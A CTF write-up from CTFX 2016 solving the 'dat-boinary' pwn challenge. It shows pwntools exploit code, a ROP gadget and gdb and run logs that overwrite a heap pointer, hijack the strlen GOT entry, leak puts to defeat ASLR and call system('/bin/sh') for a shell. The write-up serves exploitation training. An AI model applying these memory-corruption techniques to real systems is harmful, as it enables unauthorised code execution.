Title: CTFX - dat-boinary
Date: 2016-09-04 14:41
Category: CTF
Tags: ctf pwn ctfx2016
Slug: ctfx-dat-boinary
Authors: wumb0

## Reversing the Binary
This challenge provided two binaries: `dat-boinary` and `libc.so.6`. Usually this combination requires you to leak memory, calculate offsets, and call `system` or an `exec` function from libc. With that in mind I jumped right in to reversing with radare2. The functions are rather large so I will leave this as an exercise to the reader. The binary can be found [here]({attach}/files/dat-boinary).

The first block of main allocates a dynamic buffer of size 0x80 with `malloc` and gets a "meme id" of up to 9 bytes that is stored in ebp-0x20. The next block provides five menu options: update the meme id, update the meme dankness, update meme content, print meme contents, and the super secret meme option. The first 4 are pretty straight forward, while the last is not so much. 

Stack locations of interest are:

- ebp-0xc - location of menu choice (4 bytes)

- ebp-0x10 - Temporary storage for the dankness of the meme (4 bytes)

- ebp-0x14 - `malloc`ed buffer for meme content - (4 byte pointer)

- ebp-0x18 - Meme dankness if the temporary dankness is greater than 0x7f (4 bytes)

- ebp-0x20 - meme id location (8 bytes)

After some trial and error in gdb I noticed that the initial `fgets` for the id of the meme takes 9 characters instead of the provided 8. This would prove useful later.

Setting the meme id using the menu option used the length of the preexisting id to know how much to read from the user. This will also be useful, because as long as null bytes in the meme dankness can be avoided then the pointer to the `malloc`ed buffer can be overwritten and arbitrary write can be achieved. The only issue here is that this bug can only be triggered once without somehow making `strlen` return more than the actual strlen of the buffer. Again, that's a task for after investigation.

Setting the dankness involved reading in a number into ebp-0x10 (temporary dankness storage), checking if it was over 0x7f, and then moving it into the meme dankness memory location (ebp-0x18) if that check was false. This is a problem because the meme dankness is directly before the pointer that I wanted to overwrite. 

The update content option does exactly what one would expect, but with one additional check: it uses `fgets` to read into the buffer allocated by malloc. The number of bytes it reads is the dankness number. Before anything is read it checks if the dankness is over 0x80, because that would cause a buffer overflow.

Print contents is also straight forward; it prints the content of the meme with a proper call to `printf`.

Finally, the secret meme function is passed the meme id buffer and then calls `secret_meme`. The `secret_meme` function sets meme id + 8 to 0x69696969 and prints something...

[[more]]

```nohighlight
here come dat boi
      ,++++
       ###+.
        #+++
        ++++
      +++++++
   ;+#, ++++'
 ,#`    +++++
        +###'
        +###+'
      +##'#++
      .#:+++#+
      ++  ;  +
       +` ;  +
        +;; ++
       `##;#++
       #:';`+:
      ;'`:;:+;
      #``:;:+#
      # `+;':#
      #: ;'';#
      #.`.;+`:
      ';::;'#
       #.:'#'
        #+#;    o shit whaddup!
sh

it's

a

secret
```
All I can really say to that is **oh shit, whaddup?**

Nice. The important thing here is that meme id + 8 is the meme dankness. So before there was no way to set the meme dankness (located right before the content pointer) to something that is 4 bytes in length, eliminating null bytes betweek the meme id and the meme content pointer.

## Pointer Overwrite
Loading the binary up in gdb I was able to test this overwrite theory. My plan of attack was:

1. Set a breakpoint at 0x0804889d to check the stack after each operation.

2. Set the meme id to a string of length 8 to stop it from writing a null byte into the meme id buffer. It actually goes into the meme dankness, but I control that as well so it does not matter.

3. Run the `secret_meme` function to set the dankness to 0x69696969

4. Run the update id function providing 0xc bytes of junk data and then the pointer (0x41414141 for now)

<script type="text/javascript" src="https://asciinema.org/a/0zihp3unod4hbvdgwmt6ocz5e.js" id="asciicast-0zihp3unod4hbvdgwmt6ocz5e" async></script>

Success!

## Overcoming a null byte
Unfortunately the last byte of the id buffer was set to null and there was no way to unset it. This is where I got clever: what if I could make `strlen` always return a number high enough to allow the overwrite? Searching ROP gadgets in radare2 turned up one: 

```
0x08048567                 91  xchg eax, ecx
0x08048568               0408  add al, 8
0x0804856a               01c9  add ecx, ecx
0x0804856c               f3c3  ret
```

To make sure this would be okay I examined the contents of EAX and ECX when strlen is called in main:
```
eax            0xffffda88       0xffffda88
ecx            0x11             0x11
```

EAX is a temporary register and will hold the length of the string returned by `strlen` and ECX just always seems to be 0x11 when this call is made. Furthermore, playing around with the value of ECX for after the function call resulted in no crashes, so this seemed like a good solution.

To cause the overwrite I had to set the pointer (previously set to 0x41414141 above) to the address of `got.strlen`, change the dankness to 5 to allow 4 bytes of overwrite (`fgets` accounts for the null), and then write to the address of the meme content.

I decided to use pwntools for this:
```python
e = ELF('./dat-boinary')
r = process(e.path)

strlen_replace = 0x08048567
gdb.attach(r, "b * 0x0804889d")
sleep(3)

r.sendline(cyclic(8))
log.info("buffer maxed out")

r.sendline("5")
log.info("called secret meme")

r.sendline("1")
r.sendline(cyclic(0xc) + p32(e.sym['got.strlen']) + cyclic(10))
log.info("meme content should be addr of strlen")

r.sendline("2")
r.sendline("5")
log.info("set dankness to 5")

r.sendline("3")
r.sendline(p32(strlen_replace))
log.info("strlen replaced")

r.sendline("1")
r.sendline(cyclic(100))
```

Running this and stepping though each command sent showed that the GOT entry for `strlen` was overwritten with the address of the gadget:
```nohighlight
> x/x &'strlen@got.plt'
0x8049120 <strlen@got.plt>:     0x08048567
```

Trying to set the meme id again (with cyclic(100)) caused another overwrite:
```nohighlight
> x/8x $esp
0xffb136a0:     0xffb13cc9      0x0000002f      0x61616161      0x00616162
0xffb136b0:     0x61616163      0x61616164      0x61616165      0x00000000
```

So now I was able to write anything anywhere repeatedly.

## Leaking Puts

Because ASLR was enabled for this challenge I needed to leak an address of a libc function before I could call `system` to get a shell. Leaking `puts` seemed like an obvious choice. This would be done with the help of the print meme content option. All I needed to do was set the meme to the address of `puts`, print it, and then capture the first four bytes. Those first four bytes would be the ascii representation of the hex address of `puts` inside of libc. To calculate the offset to `system` all I had to do was use pwntools to rebase the libc binary and then reference `system` from the libc binary symbols. All of this is accomplished with the following python snippet:
```python
r.sendline("1")
r.sendline(cyclic(0xc) + p32(e.sym['got.puts']) + cyclic(10))
log.info("meme is now the address of puts")
r.recvrepeat(1)

r.sendline("4")
r.recvuntil("c0nT3nT:")
r.recv(1) #tab
leaked_puts = u32(r.recv(4))

libc.address = leaked_puts - libc.symbols["puts"]
r.recv(1024)
log.success("leaked puts: " + hex(leaked_puts) + ", system: " + hex(libc.symbols['system']))
```

The resulting output is promising:
```nohighlight
[*] meme is now the address of puts
[+] leaked puts: 0xf75a37e0, system: 0xf757e310
```

Checking this in the debugger confirmed that this was working correctly:
```nohighlight
> p system
$1 = {<text variable, no debug info>} 0xf757e310 <system>
```

I was ready to get the flag!


## Flag Captured
Since the meme id was being read in using `fread` and not `fgets` I was able to put a null terminated /bin/sh string right at the beginning of the meme id while still being able to set the GOT entry for `strlen` to the leaked `system` address. I chose `strlen` here because it is run on command and has the meme id buffer as its only argument. I followed the following steps to make this work:

1. Set the meme id to [/bin/sh\x00][0xc-8 bytes junk][address of strlen GOT entry][10 bytes extra to satisfy the read]
2. Set the meme dankness back to 5 in order to overwrite the meme content
3. Overwrite the `strlen` GOT entry with the leaked and calculated `system` address
4. Set the meme id to trigger system instead of strlen with /bin/sh in the buffer passed as an argument
5. Get the flag :)

The full code for the end of this exploit can be seen at the bottom of this post. Running the script on the remote host resulted in the flag!
```shell
→ python boinary.py REMOTE
[*] '/home/vagrant/CTF/ctfx/dat-boinary'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[*] '/home/vagrant/CTF/ctfx/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to problems.ctfx.io on port 1337: Done
[*] buffer maxed out
[*] called secret meme
[*] meme content should be addr of strlen
[*] set dankness to 5
[*] strlen replaced
[*] meme is now the address of puts
[+] leaked puts: 0xf75f4da0, system: 0xf75ce3e0
[*] set meme to strlen
[*] set dankness to 5
[*] set strlen to system
[*] trying shell
[+] got shell
[+] Flag: ctf(0n1y_th3_fr35h35t_m3m3s)
```

Gottem: **ctf(0n1y_th3_fr35h35t_m3m3s)**

## Full script
<script src="https://gist.github.com/wumb0/c21bdd450c6a83c6425e54f053037fcf.js"></script>
